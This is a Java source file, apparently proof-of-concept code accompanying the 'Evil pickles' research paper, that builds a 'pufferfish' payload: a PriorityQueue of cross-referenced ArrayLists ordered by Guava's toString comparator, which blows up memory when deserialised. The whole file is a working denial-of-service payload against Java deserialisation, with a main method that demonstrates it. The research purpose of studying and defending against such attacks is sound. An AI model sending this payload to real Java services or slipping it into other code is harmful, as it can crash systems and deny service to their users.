package nz.ac.vuw.jenz.evilpickles;

import com.google.common.collect.Ordering;

import java.io.*;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * Pufferfish payload showing how deserialisation of a grafted payload can lead to out of memory errors.
 * See Dietrich, Jens, Kamil Jezek, Shawn Rasheed, Amjed Tahir, and Alex Potanin. "Evil pickles: DoS attacks based on object-graph engineering." ECOOP'172017.
 * @author jens dietrich
 */
public class PufferFish {

    public static void main (String[] args) throws Exception {
        Serializable payload = constructPayload(50);
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(bout);
        oout.writeObject(payload);
        System.out.println("pufferfish serialised");

        ByteArrayInputStream bin = new ByteArrayInputStream(bout.toByteArray());
        ObjectInputStream oin = new ObjectInputStream(bin);
        oin.readObject();
        System.out.println("pufferfish de-serialised");
    }

    static Serializable constructPayload (int depth)  {

        Comparator<Object> comp = Ordering.usingToString();
        PriorityQueue<Collection> root = new PriorityQueue(comp);
        Collection s1 = new ArrayList<>() ;
        Collection s2 = new ArrayList <>() ;
        root.add(s1);
        root.add(s2);
        for (int i = 0; i < depth; i ++) {
            // insert new level and cross-reference
            Collection t1 = new ArrayList();
            Collection t2 = new ArrayList();
            t1.add("0");    t2.add("1");
            s1.add(t1);     s1.add(t2);
            s2.add(t1);     s2.add(t2);
            s1 = t1;        s2 = t2;
        }
        return root ;
    }
}
